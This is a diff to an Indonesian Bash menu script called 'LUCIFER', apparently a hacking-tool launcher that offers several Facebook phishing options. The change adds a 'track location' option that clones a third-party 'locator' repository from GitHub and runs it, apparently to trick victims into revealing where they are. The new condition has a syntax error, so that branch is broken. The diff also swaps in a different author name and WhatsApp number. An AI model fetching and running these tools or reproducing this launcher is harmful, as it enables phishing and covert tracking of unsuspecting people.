@@ -41,7 +41,8 @@ echo $i"|"$me"15"$i" |"$cy" PHISING FACEBOOK 2       "$i"|"
 echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"
 echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"
 echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN DULU       "$i"|"
-echo $i"|"$me"19"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"
+echo $i"|"$me"19"$i" |"$cy" Lacak Lokasi             "$i"|"
+echo $i"|"$me"20"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"
 echo $i"────────────────────────────────"
 echo
 echo $me"┌==="$bi"["$i"LUCIFER"$bi"]"$me"======"$bi"["$i""Pilih Nomornya""$bi"]"
@@ -231,17 +232,26 @@ pkg install nano
 figlet -f slant " S U K S E S "|lolcat
 fi
 
-if [ $pil = 19 ]
+
+if [ $pil = 19]
+then
+clear
+git clone https://github.com/thelinuxchoice/locator.git
+cd locator
+bash locator.sh
+fi
+
+if [ $pil = 20 ]
 then
 clear
 figlet -f slant "E X I T"|lolcat
 sleep 2
-echo $cy"Terima Kasih Sudah Pakai Tool Saya"
+echo $cy"Terima Kasih Sudah Pakai Tool LUCIFRR"
 sleep 2
 echo $i"Bila Ada Kesalahan Kamu Bisa Nanya Kepada Saya"
 sleep 2
-echo $ku"WhatsApp :"$i" 085835787069"
-echo $ku"Facebook :"$i" Riski Darmawan"
+echo $ku"WhatsApp :"$i" 085358963986"
+echo $ku"Facebook :"$i" Jhosua Saut Maruli"
 sleep 2
 echo $pur">> Thanks Yang Sudah Support Saya <<"
 exit
